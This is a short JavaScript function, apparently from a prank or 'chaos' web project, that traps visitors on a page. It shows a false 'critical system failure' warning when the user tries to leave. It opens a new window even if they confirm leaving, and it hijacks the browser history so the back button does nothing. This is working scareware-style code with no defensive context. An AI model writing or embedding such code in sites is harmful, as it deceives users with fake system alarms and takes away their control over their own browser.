export function setupTabTrap() {
  const message = 'CRITICAL SYSTEM FAILURE! RESTART REQUIRED. LEAVING WILL CAUSE CORRUPTION.';
  
  window.addEventListener('beforeunload', (e) => {
    e.preventDefault();
    e.returnValue = message; // Standard way to trigger native prompt
    
    // While the dialog is up, try to spawn another window just in case
    // they actually manage to click "Leave"!
    setTimeout(() => {
      window.open('/?chaos=true', '_blank');
    }, 10);
    
    return message;
  });

  // Try to block back button
  window.history.pushState(null, null, window.location.href);
  window.addEventListener('popstate', function () {
    window.history.pushState(null, null, window.location.href);
  });
}
